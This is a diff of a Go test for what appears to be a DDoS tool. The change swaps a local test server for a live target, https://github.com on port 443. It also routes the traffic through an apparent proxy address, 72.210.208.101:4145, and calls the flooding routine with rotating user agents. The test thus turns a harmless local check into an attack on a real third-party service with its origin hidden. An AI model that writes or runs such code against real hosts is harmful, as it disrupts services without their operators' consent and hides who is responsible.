@@ -6,13 +6,17 @@ import (
 )
 
 func TestDdos(t *testing.T) {
-	// create http server for testing
-	go http.ListenAndServe(":8000", nil)
-	ddoser, error := NewDDoser("GET", "http://localhost:8000")
+	req, error := http.NewRequest("GET", "https://github.com", nil)
 
 	if error != nil {
 		t.Error(error)
 	}
 
-	ddoser.Do(getUserAgents(10), 5)
+	ddoser, error := NewDDoser(req, "443", "72.210.208.101:4145")
+
+	if error != nil {
+		t.Error(error)
+	}
+
+	ddoser.Do(getUserAgents(10), 1)
 }
